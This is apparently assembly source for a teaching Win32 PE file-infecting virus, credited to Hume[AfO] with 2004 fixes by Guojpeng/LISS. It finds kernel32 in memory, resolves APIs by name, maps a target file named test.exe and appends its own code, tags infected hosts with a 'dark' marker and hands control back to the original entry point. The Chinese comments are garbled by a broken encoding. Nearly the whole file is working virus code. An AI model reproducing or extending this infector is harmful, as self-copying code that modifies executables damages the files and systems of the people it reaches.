.586 
.model flat, stdcall 
option casemap :none  ; case sensitive 
include \masm32\include\windows.inc
include \masm32\include\comctl32.inc 
includelib \masm32\lib\comctl32.lib

GetApiA        proto    :DWORD,:DWORD 

;MyTest segment 
.CODE 
;---------------�������--------------------------
_Start0:
invoke InitCommonControls        	;�˴���win2000�±������
jmp _Start
VirusLen        =  vEnd-vBegin          ;Virus ���� 
;-->>>>�������뿪ʼλ�ã������ﵽv_End�Ĳ��ֻḽ����HOST������<<<<<--
vBegin:                                 ;�����Ĳ������ִ����￪ʼ
;----------------------------------------- 
include s_api.asm             		   	;������Ҫ��api��ַ 
;-------------------����Ϊ���ݶ���---------------------- 
desfile			db "test.exe",0 ;���������ָ����ȾĿ�ꡣ
fsize			dd ?
hFile			dd ?
hMap			dd ? 
pMem			dd ? 
;----------------------------------------- 
pe_Header		dd ? 
sec_align		dd ? 
file_align		dd ? 
newEip			dd ? 
oldEip			dd ? 
oldEipTemp      dd ?
inc_size		dd ? 
oldEnd          dd ? 
;------------����MessageBoxA�������Ƽ�������ַ���λ��---------------- 
sMessageBoxA	db "MessageBoxA",0 
aMessageBoxA	dd 0 
;���߶������ʾ��Ϣ... 
sztit			db "������Ⱦ����",0 
szMsg0 		db "������Ⱦ����!",0 
CopyRight		db "The Example was First Offerred by Hume[AfO]",0dh,0ah 
                  db "Some bugs have been eliminated by Guojpeng/LISS, 2004",0dh,0ah
db "Only infect the file named test.exe of the current directory!",0dh,0ah
db "The add Code SiZe:(heX)" 
val             dd 0,0,0,0 
;;------------��>�����������λ��<<--------------------------- 
_Start: 
call   _delta
_delta:
pop    ebp                         ;�õ�delta��ַ
sub    ebp,offset _delta           ;�Ա��ں�������ض�λ
mov    dword ptr [ebp+appBase],ebp
mov    eax,[esp]                   ;���ص�ַ
xor    edx,edx 
getK32Base: 
dec    eax               ;���ֽڱȽ���֤���ٶȱȽ�������������һ��
mov    dx,word  ptr [eax+IMAGE_DOS_HEADER.e_lfanew]  ;����ecx+3ch
test   dx,0f000h         ;Dos Header+stub������̫��,����4096byte
jnz    getK32Base        ;���ټ��飬��һ��
cmp    eax,dword ptr [eax+edx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase]
jnz    getK32Base        ;��Image_Baseֵ�Ƿ����ecx��ģ����ʼֵ
mov    [ebp+k32Base],eax ;�����,����Ϊ�ҵ�kernel32��ģ��װ���ַ
lea    edi,[ebp+aGetModuleHandle] ;ediָ��API������ַ���λ��
lea    esi,[ebp+lpApiAddrs] ;esiָ��API�������ִ�ƫ�Ƶ�ַ���˵�ַ���ض�λ��
lop_get: 
lodsd 
cmp    eax,0 
jz     End_Get 
add    eax,ebp
push   eax 			;��ʱeax�з���GetModuleHandleA�������ִ���ƫ��λ��
push   dword ptr [ebp+k32Base]
call   GetApiA 
stosd
jmp    lop_get          ;���api��ַ,�μ�s_api�ļ�
End_Get: 
call   my_infect        ;��ø�API������ַ�󣬿�ʼ���ø�Ⱦģ��
include dislen.asm 	    ;���ļ��д���������ʾ�����ļ��ĳ���


CouldNotInfect:
lea    eax,[ebp+u32] 
push   eax 
call   dword ptr [ebp+aLoadLibrary]  ;����user32.dll���ӿ�
test   eax,eax 
jnz    @g12       
@g12: 
    lea    EDX,[EBP+sMessageBoxA] 
push   edx 
push   eax 
mov    eax,dword ptr [ebp+aGetProcAddress]  ;��ȡMessageBoxA�����ĵ�ַ
call   eax 
mov    [ebp+aMessageBoxA],eax 

push 10040h
call No_caption
db "û�и�Ⱦ��",0
No_caption:
call _tips
db "���������Ⱦ��Ŀ¼��δ����Ⱦ����test.exe����",0
_tips:
push 0
call [ebp+aMessageBoxA]
 
_where:                                         
xor    eax,eax          ;�ж��Ƿ����Ѿ����Ӹ�Ⱦ��־ 'dark' 
push   eax 
call   [ebp+aGetModuleHandle];��ñ���������HOST������ļ���ģ��
mov    esi,eax 
add    esi,[esi+3ch]    ; esi->�������Pe_header 
cmp    dword ptr [esi+8],'dark';�ж����Ѿ��������е�HOST���򣬻����������� 
je     jmp_oep 	              ;��HOST���򣬿���Ȩ����HOST
jmp    _xit                   ;��������������˳��������
jmp_oep: 
add    eax,[ebp+oldEip]         
jmp    eax                    ;���������������ڵ�

my_infect:        ;��Ⱦ����,�ļ���д����,PE�ļ��޸Ĳμ�modipe.asm�ļ�
xor    eax,eax 
push   eax 
push   eax 
push   OPEN_EXISTING 
push   eax 
push   eax 
push   GENERIC_READ+GENERIC_WRITE 
lea    eax,[ebp+desfile]      ;Ŀ���ļ��ļ����ִ�ƫ�Ƶ�ַ
push   eax 
call   [ebp+aCreateFile]      ;��Ŀ���ļ� 
inc    eax                    ;�緵��-1�����ʾʧ��
je     _Err 
dec    eax 
mov    [ebp+hFile],eax        ;�����ļ����

push   eax 
sub    ebx,ebx 
push   ebx 
push   eax            		  ;�õ��ļ���С 
call   [ebp+aGetFileSize] 
inc    eax                    ;�緵��-1�����ʾʧ��
je      _sclosefile 
dec    eax 
mov    [ebp+fsize],eax 
xchg   eax,ecx 
add    ecx,1000h              ;�ļ���С����4096bytes 
pop    eax
xor    ebx,ebx                ;����ӳ���ļ�
push   ebx           		  ;����û�����ֵ��ļ�ӳ��
push   ecx           		 ;�ļ���С����ԭ��С+Vsize 
push   ebx             
push   PAGE_READWRITE 
push   ebx 
push   eax 
call   [ebp+aCreateFileMapping] 
test   eax,eax               ;�緵��0��˵������
je     _sclosefile           ;�����ɹ���?���ɹ�������ת
mov    [ebp+hMap],eax        ;����ӳ�������
xor    ebx,ebx 
push   ebx 
push   ebx 
push   ebx 
push   FILE_MAP_WRITE     
push   eax 
call   [ebp+aMapViewOfFile] 
test   eax,eax               ; ӳ���ļ�,�Ƿ�ɹ�?
je     _sclosemap            ;����0˵����������ʧ��   
mov    [ebp+pMem],eax        ;�����ڴ�ӳ���ļ��׵�ַ
;-------------------------------------------- 
; �����Ǹ�HOST����½ڵĴ���
;-------------------------------------------- 
include modipe.asm           ;���ļ�����ҪΪ��ȾĿ���ļ��Ĵ���
_sunview: 
push   [ebp+pMem]
call   [ebp+aUnmapViewOfFile]
;���ӳ�䣬ͬʱ�޸Ĺ���ӳ���ļ�ȫ��д��Ŀ���ļ�
_sclosemap: 
push   [ebp+hMap] 
call   [ebp+aCloseHandle] 	 ;�ر�ӳ��
_sclosefile: 
push   [ebp+hFile] 
call   [ebp+aCloseHandle]    ;�رմ򿪵�Ŀ���ļ�
_Err: 
ret
;----------------------------------------- 
_xit:
push   0 
call   [ebp+aExitProcess]    ;�˳��������� 
vEnd:                            ;����һ�£�����ĩβλ���Ƿ������ǰ��
;MyTest ends
end  _Start0

